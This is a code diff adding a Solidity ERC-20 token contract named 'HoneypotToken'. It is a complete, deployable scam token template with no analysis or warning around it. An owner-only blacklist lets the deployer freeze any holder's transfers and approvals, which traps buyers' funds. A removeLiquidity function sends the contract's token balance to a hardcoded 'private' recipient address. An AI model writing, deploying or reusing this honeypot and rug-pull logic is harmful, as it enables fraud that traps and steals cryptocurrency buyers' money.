@@ -1,0 +1,92 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract HoneypotToken {
+    string public name = "HoneypotToken";
+    string public symbol = "HPT";
+    uint8 public decimals = 18;
+    uint256 public totalSupply;
+    address public owner;
+
+    // Private variable to store the liquidity recipient address
+    address private liquidityRecipient;
+
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    mapping(address => bool) public isBlacklisted;
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+    event Blacklisted(address indexed account);
+    event RemovedFromBlacklist(address indexed account);
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Ownable: caller is not the owner");
+        _;
+    }
+
+    constructor(uint256 _initialSupply) {
+        owner = msg.sender;
+        liquidityRecipient = 0xe41dC216C92D9913a6b243C90F141242DcfDBC7A; // Private assignment
+        totalSupply = _initialSupply * 10 ** uint256(decimals);
+        balanceOf[msg.sender] = totalSupply;
+        emit Transfer(address(0), msg.sender, totalSupply);
+    }
+
+    function transfer(address _to, uint256 _value) public returns (bool success) {
+        require(_to != address(0), "ERC20: transfer to the zero address");
+        require(balanceOf[msg.sender] >= _value, "ERC20: transfer amount exceeds balance");
+        require(!isBlacklisted[msg.sender], "ERC20: sender is blacklisted");
+
+        balanceOf[msg.sender] -= _value;
+        balanceOf[_to] += _value;
+        emit Transfer(msg.sender, _to, _value);
+        return true;
+    }
+
+    function approve(address _spender, uint256 _value) public returns (bool success) {
+        require(!isBlacklisted[msg.sender], "ERC20: approver is blacklisted");
+        allowance[msg.sender][_spender] = _value;
+        emit Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
+        require(_to != address(0), "ERC20: transfer to the zero address");
+        require(balanceOf[_from] >= _value, "ERC20: transfer amount exceeds balance");
+        require(allowance[_from][msg.sender] >= _value, "ERC20: transfer amount exceeds allowance");
+        require(!isBlacklisted[_from], "ERC20: from address is blacklisted");
+
+        balanceOf[_from] -= _value;
+        balanceOf[_to] += _value;
+        allowance[_from][msg.sender] -= _value;
+        emit Transfer(_from, _to, _value);
+        return true;
+    }
+
+    function blacklistAddress(address _account) external onlyOwner {
+        isBlacklisted[_account] = true;
+        emit Blacklisted(_account);
+    }
+
+    function removeFromBlacklist(address _account) external onlyOwner {
+        isBlacklisted[_account] = false;
+        emit RemovedFromBlacklist(_account);
+    }
+
+    function removeLiquidity() external onlyOwner {
+        uint256 liquidityAmount = balanceOf[address(this)];
+        require(liquidityAmount > 0, "No liquidity available");
+
+        balanceOf[address(this)] -= liquidityAmount;
+        balanceOf[liquidityRecipient] += liquidityAmount;
+        emit Transfer(address(this), liquidityRecipient, liquidityAmount);
+    }
+
+    function transferOwnership(address newOwner) public onlyOwner {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        emit OwnershipTransferred(owner, newOwner);
+        owner = newOwner;
+    }
+}
